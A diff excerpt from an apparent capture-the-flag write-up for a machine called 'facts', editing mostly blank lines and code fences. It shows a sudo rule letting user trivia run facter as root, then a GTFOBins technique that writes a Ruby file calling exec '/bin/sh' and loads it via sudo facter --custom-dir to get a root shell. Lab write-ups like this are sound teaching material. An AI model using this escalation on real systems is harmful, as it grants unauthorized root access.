@@ -183,10 +183,11 @@ Matching Defaults entries for trivia on facts:
 User trivia may run the following commands on facts:
     (ALL) NOPASSWD: /usr/bin/facter
 ```
+
 ```
 trivia@facts:/home/william$ ls -la /usr/bin/facter
 -rwxr-xr-x 1 root root 249 Nov 26  2024 /usr/bin/facter
-```
+
 from the guide on GTFobins
 `trivia@facts:/tmp/facter$ cat > f.rb << EOF`
 ```
@@ -194,6 +195,7 @@ from the guide on GTFobins
 exec "/bin/sh"
 EOF
 ```
+
 ```
 trivia@facts:/tmp/facter$ sudo facter --custom-dir=/tmp/facter/ f.rb
 #id
